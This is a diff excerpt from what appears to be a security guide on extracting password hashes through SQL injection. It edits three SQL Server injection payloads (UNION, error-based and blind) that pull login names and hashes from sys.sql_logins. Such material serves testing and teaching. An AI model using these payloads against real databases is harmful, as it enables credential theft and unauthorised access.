@@ -149,13 +149,13 @@ If you have SQL injection access to a database, you might be able to extract has
 
 ```sql
 -- UNION attack to extract hashes
-' UNION SELECT name, CAST(password_hash AS nvarchar(max)), NULL FROM sys.sql_logins--
+UNION SELECT name, CAST(password_hash AS nvarchar(max)), NULL FROM sys.sql_logins--
 
 -- Error-based extraction
-' AND 1=CONVERT(int, (SELECT TOP 1 name + ':' + CAST(password_hash AS nvarchar(max)) FROM sys.sql_logins))--
+AND 1=CONVERT(int, (SELECT TOP 1 name + ':' + CAST(password_hash AS nvarchar(max)) FROM sys.sql_logins))--
 
 -- Blind extraction
-' AND ASCII(SUBSTRING((SELECT TOP 1 CAST(password_hash AS nvarchar(max)) FROM sys.sql_logins), 1, 1)) > 65--
+AND ASCII(SUBSTRING((SELECT TOP 1 CAST(password_hash AS nvarchar(max)) FROM sys.sql_logins), 1, 1)) > 65--
 ```
 
 ### Detecting Weak Password Implementations
